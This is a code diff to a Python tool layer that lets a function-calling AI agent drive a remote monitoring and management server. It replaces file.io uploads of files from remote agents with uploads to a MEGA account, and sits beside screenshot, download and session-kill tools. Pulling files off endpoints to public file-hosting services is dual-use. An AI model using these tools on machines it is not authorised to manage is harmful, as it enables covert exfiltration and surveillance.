@@ -189,23 +189,22 @@ def tool_queue_download(client: RmmApiClient, session_ref: str, remote_path: str
     return _json_result({"ok": code == 200, "status": code, "queued": remote_path, "data": data})
 
 
-def tool_queue_fileio(
-    client: RmmApiClient,
-    session_ref: str,
-    remote_path: str,
-    expires: str | None = None,
-) -> str:
+def tool_queue_mega(client: RmmApiClient, session_ref: str, remote_path: str) -> str:
     sid, _ = _resolve_session_id(client, session_ref)
     if not sid:
         return _json_result({"ok": False, "error": "session_not_found"})
-    code, data = client.queue_fileio(sid, remote_path, expires=expires)
+    code, data = client.queue_mega(sid, remote_path)
     return _json_result({
         "ok": code == 200,
         "status": code,
         "queued": remote_path,
-        "expires": expires,
         "data": data,
     })
+
+
+def tool_get_mega_config(client: RmmApiClient) -> str:
+    code, data = client.get_mega_config()
+    return _json_result({"ok": code == 200, "status": code, "data": data})
 
 
 def tool_queue_screenshot(client: RmmApiClient, session_ref: str) -> str:
@@ -297,9 +296,8 @@ TOOL_HANDLERS = {
     ),
     "kill_session": lambda c, a: tool_kill_session(c, a["session_ref"]),
     "queue_download": lambda c, a: tool_queue_download(c, a["session_ref"], a["remote_path"]),
-    "queue_fileio": lambda c, a: tool_queue_fileio(
-        c, a["session_ref"], a["remote_path"], a.get("expires")
-    ),
+    "queue_mega": lambda c, a: tool_queue_mega(c, a["session_ref"], a["remote_path"]),
+    "get_mega_config": lambda c, a: tool_get_mega_config(c),
     "queue_screenshot": lambda c, a: tool_queue_screenshot(c, a["session_ref"]),
     "queue_upload": lambda c, a: tool_queue_upload(
         c, a["session_ref"], a["local_path"], a["remote_path"]
@@ -463,20 +461,24 @@ OPENAI_TOOLS: list[dict] = [
     {
         "type": "function",
         "function": {
-            "name": "queue_fileio",
-            "description": "Queue upload of a remote agent file to file.io (ephemeral public link).",
+            "name": "queue_mega",
+            "description": "Queue upload of a remote agent file to MEGA (server account; link in events).",
             "parameters": {
                 "type": "object",
                 "properties": {
                     "session_ref": {"type": "string"},
                     "remote_path": {"type": "string"},
-                    "expires": {
-                        "type": "string",
-                        "description": "Optional file.io expiry token (14d, 1w, 1m, …)",
-                    },
                 },
                 "required": ["session_ref", "remote_path"],
             },
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "get_mega_config",
+            "description": "Show MEGA account configuration on the RMM server (masked email, folder, limits).",
+            "parameters": {"type": "object", "properties": {}},
         },
     },
     {
